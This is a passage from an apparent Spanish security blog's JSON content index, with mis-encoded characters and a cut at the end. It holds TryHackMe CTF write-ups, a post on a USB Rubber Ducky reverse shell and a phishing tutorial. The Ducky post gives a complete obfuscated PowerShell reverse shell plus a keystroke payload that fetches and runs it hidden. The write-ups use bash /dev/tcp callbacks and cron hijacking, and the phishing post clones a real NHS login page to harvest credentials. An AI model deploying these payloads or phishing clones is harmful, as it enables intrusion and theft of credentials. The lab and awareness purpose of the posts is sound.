una parte que decÃ­a que habÃ­an puesto el id_rsa de dale en el archivo de configuraciÃ³n del ssh asÃ­ que podemos probar de ver el archivo /etc/ssh/sshd_config\nNos lo guardamos en un archivo llamado id_rsa le damos permisos con chmod chmod 600 id_rsa, por Ãºltimo nos conectamos por ssh ssh -i id_rsa dale@10.10.67.245\nEscalada de privilegios Gyles Con sudo -l vemos que podemos ejecutar un archivo como gyles sin proporcionar contraseÃ±a\ndale@TEAM:~$ sudo -l User dale may run the following commands on TEAM: (gyles) NOPASSWD: /home/gyles/admin_checks Si le hacemos un cat podemos ver que hay una parte en la cual se guarda un input nuestro ($error) y lo ejecuta\n#!/bin/bash printf \u0026#34;Reading stats.\\n\u0026#34; sleep 1 printf \u0026#34;Reading stats..\\n\u0026#34; sleep 1 read -p \u0026#34;Enter name of person backing up the data: \u0026#34; name echo $name \u0026gt;\u0026gt; /var/stats/stats.txt read -p \u0026#34;Enter \u0026#39;date\u0026#39; to timestamp the file: \u0026#34; error printf \u0026#34;The Date is \u0026#34; $error 2\u0026gt;/dev/null date_save=$(date \u0026#34;+%F-%H-%M\u0026#34;) cp /var/stats/stats.txt /var/stats/stats-$date_save.bak printf \u0026#34;Stats have been backed up\\n\u0026#34; dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks Reading stats. Reading stats.. Enter name of person backing up the data: test Enter \u0026#39;date\u0026#39; to timestamp the file: /bin/bash The Date is whoami gyles Ya somos gyles\n(Para que salga el prompt podemos poner script /dev/null -c bash)\nRoot En el directorio /opt/admin_stuff hay un script de root\n-rwxr--r-- 1 root root 200 Jan 17 2021 script.sh con lo siguiente:\n#!/bin/bash #I have set a cronjob to run this script every minute dev_site=\u0026#34;/usr/local/sbin/dev_backup.sh\u0026#34; main_site=\u0026#34;/usr/local/bin/main_backup.sh\u0026#34; #Back ups the sites locally $main_site $dev_site Podemos ver que ejecuta dos scripts y dice que este archivo se ejecuta cada minuto automÃ¡ticamente como root\nEste archivo no lo podemos modificar pero el main_backup.sh sÃ­.\nLo que vamos a hacer es dentro del main_backup.sh poner lo siguiente para mandarnos una reverse shell por el puerto 443\nbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026#34; Nos ponemos en escucha por el puerto 443 con nc y a esperar\nRecibimos la reverse shell como root!\n","date":"2023-02-09","id":85,"permalink":"/writeups/tryhackme/team/","summary":"https://tryhackme.com/room/teamcw\nIP Atacante = 10.10.10.10\nIP VÃ­ctima = 10.10.67.245\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene","tags":["CTF","FÃ¡cil","Linux","Fuzzing","Directory Traversal","cronjob"],"title":"Team"},{"content":"","date":"2023-02-05","id":86,"permalink":"/tags/hak5/","summary":"","tags":[],"title":"hak5"},{"content":"","date":"2023-02-05","id":87,"permalink":"/tags/reverse-shell/","summary":"","tags":[],"title":"Reverse shell"},{"content":"Â¿QuÃ© es una reverse shell? Una reverse shell (conexiÃ³n inversa), es una tÃ©cnica utilizada en hacking para obtener acceso remoto a un dispositivo comprometido.\n\u0026ldquo;Esquema sacado de https://sshteam.com/en/conexiones-inversas-y-directas/\u0026rdquo;\nReverse shell a un windows con RubberDucky inject.ps1 Para crear la Reverse shell vamos a usar este script de PowerShell hecho por 0iphor13, nos lo tenemos que guardar en un archivo llamado inject.ps1\n$I=\u0026#39;192.168.1.142\u0026#39;;$P=443;$0LVhbQ=[TyPE](\u0026#39;tExT\u0026#39;+\u0026#39;.enCOD\u0026#39;+\u0026#39;InG\u0026#39;);$C=.(\u0026#39;New\u0026#39;+\u0026#39;-Obj\u0026#39;+\u0026#39;ect\u0026#39;) System.Net.Sockets.TCPClient($I,$P);$S=$C.GetStream();[byte[]]$b=0..65535|\u0026amp;(\u0026#39;%\u0026#39;){0};while(($i=$S.Read($b,0,$b.Length))-ne 0){;$d=(\u0026amp;(\u0026#39;New\u0026#39;+\u0026#39;-Ob\u0026#39;+\u0026#39;ject\u0026#39;) -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$X=(\u0026amp;(\u0026#39;ie\u0026#39;+\u0026#39;x\u0026#39;) $d 2\u0026gt;\u0026amp;1 | .(\u0026#39;Out\u0026#39;+\u0026#39;-St\u0026#39;+\u0026#39;ring\u0026#39;));$Z=$X+\u0026#39;ReverseDucky \u0026#39;+(\u0026amp;(\u0026#39;g\u0026#39;+\u0026#39;l\u0026#39;))+\u0026#39;~ \u0026#39;;$sbt=($0lvHBq::ASCII).GetBytes($Z);$S.Write($sbt,0,$sbt.Length);$S.Flush()};$C.Close() La variable \u0026lsquo;I\u0026rsquo; tiene que ser la ip del atacante\n$I=\u0026#39;192.168.1.142\u0026#39; La variable \u0026lsquo;P\u0026rsquo; tiene que ser el puerto por el cual vamos a estar en escucha, en este caso el puerto 443\n$P=443 Ahora desde la carpeta que tenemos guardado el script vamos a abrir un servidor con python por el puerto 80 para podernos pasar el script a la mÃ¡quina vÃ­ctima\nsudo python3 -m http.server 80 Rubber Ducky payload Por parte del rubberducky vamos a usar este payload\nDELAY 2500 GUI r DELAY 1000 STRING powershell -w hidden \u0026#34;IEX(New-Object Net.WebClient).downloadString(\u0026#39;http://192.168.1.142/inject.ps1\u0026#39;)\u0026#34; ENTER Este payload lo que hace es:\nEsperar 2,5 segundos Presionar windows + r para abrir el lanzador de windows Esperar 1 segundo para que se abra el lanzador de windows Ejecuta un comando que lo que hace es descargarse el inject.ps1 de la mÃ¡quina del atacante desde el servidor que hemos montado previamente en python y lo ejecuta en segundo plano sin mostrar nada por pantalla Para pasarlo a binario vamos a usar la web https://ducktoolkit.com/encode, vamos a pegar ahÃ­ el script, seleccionamos el idioma que tenga el teclado de la victima, lo descargamos y lo pasamos a la micro sd del rubber ducky.\nPor Ãºltimo solo nos queda ponernos en escucha con netcat por el puerto 443.\nsudo nc -nlvp 443 Resultado DespuÃ©s de conectar el USB a la mÃ¡quina vÃ­ctima, en el servidor de python podemos ver como el rubber ducky a hecho una peticiÃ³n GET desde la mÃ¡quina vÃ­ctima\nDesde la terminal que estÃ¡bamos en escucha por el puerto 443 con nc podemos ver que hemos recibido una conexiÃ³n de la mÃ¡quina vÃ­ctima\nMientras que desde la mÃ¡quina vÃ­ctima no se ve nada raro\nVideo del resultado:\n","date":"2023-02-05","id":88,"permalink":"/blog/reverse-shell-con-el-usb-rubberducky/","summary":"Vamos a estar preparando el USB Ruber Ducky con un payload el cual no permitirÃ¡ mandarnos una reverse shell desde una mÃ¡quina Windows con el Windows defender activad","tags":["USB","hak5","Reverse shell"],"title":"Reverse shell con el USB RubberDucky"},{"content":"","date":"2023-02-05","id":89,"permalink":"/tags/usb/","summary":"","tags":[],"title":"USB"},{"content":"","date":"2023-02-04","id":90,"permalink":"/tags/ingenieria-social/","summary":"","tags":[],"title":"Ingenieria social"},{"content":"Â¿QuÃ© es? Consiste en crear un correo, web o mensaje que se haga pasar por una empresa legÃ­tima, para que la vÃ­ctima introduzca datos importantes creyÃ©ndose que lo estÃ¡ haciendo en el sitio real\nIngenierÃ­a social Se entiende como ingenierÃ­a social al conjunto de tÃ©cnicas para manipular o engaÃ±ar a las personas para infectar con archivos maliciosos u obtener informaciÃ³n o acceso a ordenadores, redes, empresas\u0026hellip;\nTipos de phishing ğŸ“² Smishing\nSe realiza a travÃ©s de mensajes de texto\nâ˜ï¸ Vishing\nSe realiza mediante llamadas telefÃ³nicas\nğŸ’¿ Baiting\nSe realiza mediante USB, DVD, CD que pondrÃ¡ un archivo malicioso en el dispositivo\nEjemplo de ingenierÃ­a social usando la tÃ©cnica baiting en la serie Mr.Robot\nExisten varias herramientas para hacer phishings como Social-Engineer Toolkit que ya viene instalada con kali linux y parrot. Aparte de hacer phishing tambiÃ©n sirve para hacer muchos tipos de ataques de ingenierÃ­a social. Zphisher es otra herramienta de phishing que ya viene con muchas plantillas de webs tÃ­picas instaladas\nSimulaciÃ³n de un phishing web con Social-Engineer Toolkit Esto se hace con fines educativos para concienciar de los peligros de internet\ngithub.com/trustedsec/social-engineer-toolki\nPara este ejemplo vamos a usar Social-Engineer Toolkit.\nLa web que vamos a clonar va a ser https://www.nhseportfolios.org/Anon/Login/Login.aspx\nY nuestro target va a ser pepito\nConfiguraciÃ³n Social-Engineer Toolkit Al ejecutarlo nos aparece un menu con varias opciones, vamos a escojer \u0026ldquo;Social-Engineering Attacks\u0026rdquo;, \u0026ldquo;Website Attack Vectors\u0026rdquo; y \u0026ldquo;Credential Harvester Attack Method\u0026rdquo;. Ahora nos deja 3 opciones\nWeb Templates\nEsta opciÃ³n sirve para clonar webs que el programa ya tiene clonadas. Nos da la opciÃ³n de Google y Twitter\nTemplate de google:\nCustom Import\nEsta opciÃ³n nos permite crear la web desde 0 o importarla de forma manual. Para pasÃ¡rsela al programa tendremos que poner la ruta completa de donde estÃ¡n los archivos de la web en nuestra mÃ¡quina\nSite cloner\nEsta es la opciÃ³n mÃ¡s interesante, ya que con solo poner el enlace de una web ya nos la clona\nComo nosotros queremos clonar la web de nhseportfolios.org vamos a elegir la opciÃ³n de site cloner y le proporcionamos la url\nset:webattack\u0026gt; Enter the url to clone:https://www.nhseportfolios.org/Anon/Login/Login.aspx Ahora en local vamos a tener corriendo una web exactamente igual que la original y el programa se va a quedar en escucha de conexiones\nResultado Desde el punto de vista de la vÃ­ctima ahora al clicar en este enlace http://ip_atacante va a ver el clon de la web original\nAl poner credenciales. Â¡Desde el lado del atacante en la terminal que estaba corriendo el programa vemos que ha reportado las credenciales!\nPOSSIBLE USERNAME FIELD FOUND: $UserName=pepito POSSIBLE PASSWORD FIELD FOUND: $Password=secret123 Este mÃ©todo funciona, pero no queda muy creÃ­ble que la url sea una ip.\nHay varias formas para hacerlo mÃ¡s creÃ­ble como por ejemplo cambiando el /etc/hosts, alojarla a un servidor o combinarla con un qr\nCambiar el /etc/hosts Hay un archivo en linux /etc/hosts/ y en windows C:\\Windows\\System32\\drivers\\etc\\hosts. Este archivo se usa para asociar ip\u0026rsquo;s a dominios. Si se aÃ±ade una lÃ­nea con lo siguiente\n192.168.1.142 nhseportfolios.org #IP atacante Dominio Ahora cada vez que entremos a nhseportfolios.org nos va a mandar a la 192.168.1.142. Este mÃ©todo funciona, pero no es muy prÃ¡ctico porque solo lo puedes hacer con alguien que estÃ© en tu misma red y tienes que cambiar el etc/hosts que para hacerlo necesitas permisos de administrador en la mÃ¡quina vÃ­ctima, aunque con un troyano se podrÃ­a cambiar. Pero no es muy eficiente\nMail La forma mÃ¡s tÃ­pica de manda webs falsas es por correo. Los atacantes mandan los correos intentando crear una situaciÃ³n de pÃ¡nico a la vÃ­ctima para que se ponga nerviosa y clique en el enlace\nQR Otra forma de colar el phishing serÃ­a mediante un codigÃ³ qr que lleve a la pÃ¡gina que hemos clonado. Esto lo podemos hacer en la misma herramienta Social-Engineer Toolkit en el apartado de qr\nNos pide la web que queremos que nos lleve el qr\nVemos que nos ha generado la imagen del qr y la ha guardado en /root/.set/reports/qrcode_attack.png\nEsto se puede combinar con un correo.\nComo detectarlo Antes de clicar o descargar algo de un correo se tienen que seguir estos pasos\nComprobar que la direcciÃ³n es de un sitio conocido y comprobar que no tenga letras de mÃ¡s, letras por nÃºmeros, muchos puntos\u0026hellip;\nAntes de clicar a cualquier enlace es importante verificar que ese sea el original de la empresa. Si es un botÃ³n y no se ve el enlace se puede hacer \u0026ldquo;hovering\u0026rdquo; que es pasar por encima el ratÃ³n sin clicar para que salga el enlace abajo a la izquierda. Es recomendable acceder manualmente a la web y no con enlaces de correo\nMuchos ataques los hacen con traductores asÃ­ que la sintaxis de los mensajes de phishing no suele ser muy buena\nRecuerda que la vulnerabilidad mÃ¡s grande de un dispositivo es el usuario\nComo evitarlo Es recomendable tener un antivirus en el pc, actualmente casi todos los antivirus cuentan con la opciÃ³n de bloquear posibles phishings\nSi eres el tÃ©cnico de una empresa lo que puedes hacer es desde el antivirus bloquear todas las posibles combinaciones que puede haber de un dominio. Por ejemplo si estÃ¡s en una empresa de un banco y los empleados siempre para trabajar tienen que acceder a bancoseguro123.com puedes con la herramienta urlcrazy generar dominios parecidos al original y meterlos en una blacklist del antivirus, Siempre que no se bloquee una web legitima porque podria afectar negativamente a los trabajadores\n$ urlcrazy -r bancoseguro123.com Typo Type Typo Domain ---------------------------------------------------------------- Original bancoseguro123.com Character Omission bacoseguro123.com Character Omission bancoeguro123.com Character Omission bancosegro123.com Character Omission bancoseguo123.com Character Omission bancosegur123.com Character Omission bancoseguro12.com Character Omission bancoseguro123.cm Character Omission bancoseguro123.co Character Omission bancoseguro13.com Character Omission bancoseguro23.com Character Omission bancoseuro123.com Character Omission bancosguro123.com Character Omission bancseguro123.com Character Omission banoseguro123.com Character Omission bncoseguro123.com Character Repeat baancoseguro123.com Character Repeat banccoseguro123.com ... ... Que hacer si ya has caÃ­do en un phishing Lo primero es ponerte en contacto con el soporte de la empresa, si lo que te han robado son las contraseÃ±as cÃ¡mbialas y si tienes la misma contraseÃ±a en otra web tambiÃ©n es importante cambiarla. Por Ãºltimo se puede denunciar a la policÃ­a como un delito de fraude\n","date":"2023-02-04","id":91,"permalink":"/blog/phishing/","summary":"Los casos de phishing en EspaÃ±a han aumentado un 30% en 2022. Pero, Â¿Sabes que son? Â¿QuÃ© tipos hay? Â¿CÃ³mo se hacen? Â¿CÃ³mo puedes protegerte?","tags":["Ingenieria social"],"title":"Phishing"},{"content":"https://tryhackme.com/room/startup\nIP Atacante = 10.10.10.10\nIP VÃ­ctima = 10.10.76.5\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\n\u0026gt; ping -c 1 10.10.76.5 PING 10.10.76.5 (10.10.76.5) 56(84) bytes of data. 64 bytes from 10.10.76.5: icmp_seq=1 ttl=63 time=116 ms --- 10.10.76.5 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 116.037/116.037/116.037/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.76.5 -oG allPorts ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.76.5 5 â”‚ [*] Open ports: 21,22,80 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\nâ¯ nmap -p22,80 -sC -sV 10.10.76.5 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxrwxrwx 2 65534 65534 4096 Nov 12 2020 ftp [NSE: writeable] | -rw-r--r-- 1 0 0 251631 Nov 12 2020 important.jpg |_-rw-r--r-- 1 0 0 208 Nov 12 2020 notice.txt | ftp-syst: | STAT: | FTP server status: | Connected to 10.18.108.198 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b9a60b841d2201a401304843612bab94 (RSA) | 256 ec13258c182036e6ce90e1626eba2be (ECDSA) |_ 256 a2ff2a7281aaa29f55a4dc9223e6b43f (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Maintenance Puerto 21 (ftp) El nmap ha reportado que nos podemos conectar por ftp como anonymous. Dentro del ftp hay tres archivos: .test_log, important.jpg y notice.txt, tambiÃ©n hay un directorio llamado ftp en el cual tenemos permisos de escritura.\nNos pasamos los tres archivos con get \u0026quot;archivo\u0026quot; para analizarlos desde nuestra mÃ¡quina. NingÃºn archivo contienen informaciÃ³n relevante\nPuerto 80 (http) Subdirectorios Empezamos con un escaneo de subdirectorios, vamos a usar dirb\ndirb 10.10.76.5 Nos encuentra el subdirectorio files. Dentro de files vemos que hay los mismos archivos que en el ftp, teniendo en cuenta que en el ftp habÃ­a una carpeta en la cual podÃ­amos subir archivos, podemos probar de subir una reverse shell con php para despuÃ©s ejecutarla desde la web.\nIntrusiÃ³n Nos bajamos el .php\nwget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php Es importante cambiar las lÃ­neas de ip y puerto.\nComo normalmente la extensiÃ³n .php estÃ¡ bloqueada, lo vamos a cambiar a .phtml\nAhora ya nos podemos volver a conectar por ftp y dentro de la carpeta ftp subir el .phtml con put\nPor Ãºltimo nos ponemos en escucha por el puerto 443 y desde la web ejecutamos el archivo. Ya tenemos la reverse shell\nTratamiento de tty Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Escalda de privilegios Lennie En /incidents vemos un archivo el cual parece que contiene un historial de los comandos que se han ejecutado, buscando un poco vemos un sitio donde salen unas credenciales\u0026hellip;\nRoot Con la herramienta pspy podemos ver como se ejecuta automÃ¡ticamente como root el archivo /home/lennie/scripts/planner.sh.\nNo tenemos permisos de escritura para este archivo, pero ese archivo ejecuta otro archivo: /etc/printf.sh, en este sÃ­ que tenemos permisos de escritura.\nDentro vamos a poner bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/442 0\u0026gt;\u0026amp;1\u0026quot; y nos vamos a poner en escucha por el puerto 442.\nÂ¡Recibimos la conexiÃ³n y YA SOMOS ROOT!!!!!\n","date":"2023-01-20","id":92,"permalink":"/writeups/tryhackme/startup/","summary":"https://tryhackme.com/room/startup\nIP Atacante = 10.10.10.10\nIP VÃ­ctima = 10.10.76.5\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene","tags":["CTF","FÃ¡cil","Linux","cron","file upload"],"title":"Startup"},{"content":"","date":"2023-01-19","id":93,"permalink":"/tags/cve-2019-15107/","summary":"","tags":[],"title":"CVE-2019-15107"},{"content":"","date":"2023-01-19","id":94,"permalink":"/tags/cve-2019-15231/","summary":"","tags":[],"title":"CVE-2019-15231"},{"content":"https://tryhackme.com/room/source\nIP Atacante = 10.10.10.10\nIP VÃ­ctima = 10.10.16.237\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nping -c 1 10.10.16.237 PING 10.10.16.237 (10.10.16.237) 56(84) bytes of data. 64 bytes from 10.10.16.237: icmp_seq=1 ttl=63 time=61.1 ms --- 10.10.16.237 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 61.096/61.096/61.096/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.16.237 -oG allPorts ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.186.98 5 â”‚ [*] Open ports: 22,10000 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\nnsmap -p22,10000 -sC -sV 10.10.16.237 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b74cd0bde27b1b15722764562915ea23 (RSA) | 256 b78523114f44fa22008e40775ecf287c (ECDSA) |_ 256 a9fe4b82bf893459365becdac2d395ce (ED25519) 10000/tcp open http MiniServ 1.890 (Webmin httpd) |_http-title: Site doesn\u0026#39;t have a title (text/html; Charset=iso-8859-1). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Puerto 10000 El nmap ha reportado la versiÃ³n del puerto 10000 (Webmin 1.890) la cual con una bÃºsqueda rÃ¡pida por google podemos ver que es vulnerable. He encontrado en github un exploit: https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE, al ejecutarlo podemos ejecutar comandos como root en el servidor, pero necesitamos pasarlos por un url encoder antes de mandarlos.\nIntrusiÃ³n Como podemos ejecutar comandos como root en el servidor podemos ya directamente ver las 2 flags o mandarnos una reverse shell.\nNos ponemos en escucha por el puerto 443\nnc -nlvp 443 Ahora enviamos con el exploit el comando para mandarnos una reverse shell bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.237%2F443%200%3E%261%22. Y ya somos root\n","date":"2023-01-19","id":95,"permalink":"/writeups/tryhackme/source/","summary":"https://tryhackme.com/room/source\nIP Atacante = 10.10.10.10\nIP VÃ­ctima = 10.10.16.237\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene","tags":["CTF","FÃ¡cil","Linux","CVE-2019-15107","CVE-2019-15231"],"title":"Source"},{"content":"","date":"2023-01-18","id":96,"permalink":"/tags/mediana/","summary":"","tags":[],"title":"Mediana"},{"content":"https://tryhackme.com/room/mustacchio\nIP Atacante = 10.10.10.10\nIP VÃ­ctima = 10.10.3.160\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nping -c 1 10.10.131.18 PING 10.10.131.18 (10.10.131.18) 56(84) bytes of data. 64 bytes from 10.10.131.18: icmp_seq=1 ttl=63 time=372 ms --- 10.10.131.18 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 371.643/371.643/371.643/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.131.18 -oG allPorts ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.131.18 5 â”‚ [*] Open ports: 22,80,8765 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\nâ¯ nmap -p22,80,8765 -sC -sV 10.10.131.18 PORT STATE 